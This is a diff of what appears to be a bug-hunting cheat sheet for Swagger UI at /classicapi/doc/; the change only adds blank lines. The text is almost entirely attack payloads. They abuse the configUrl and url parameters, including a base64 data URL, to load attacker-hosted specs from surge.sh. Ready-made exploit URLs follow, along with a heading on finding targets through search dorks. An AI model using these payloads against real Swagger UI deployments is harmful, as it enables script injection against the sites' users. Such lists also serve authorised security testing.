@@ -3,13 +3,18 @@ Swagger UI can be found at /classicapi/doc/
 
 ▪ Payloads:
 • `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
+
 • `?configUrl=https://jumpy-floor.surge.sh/test.json`
+
 • `?url=https://jumpy-floor.surge.sh/test.yaml`
+
 • The payload might not work, so we move on to the next payload, and so on.
 
 ▪ Final payload examples:
 - `https://example.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
+
 - `https://example.com/classicapi/doc/?configUrl=https://jumpy-floor.surge.sh/test.json`
+
 - `https://example.com/classicapi/doc/?url=https://jumpy-floor.surge.sh/test.yaml`
 
 ▪ Find Swagger UI using dorks:
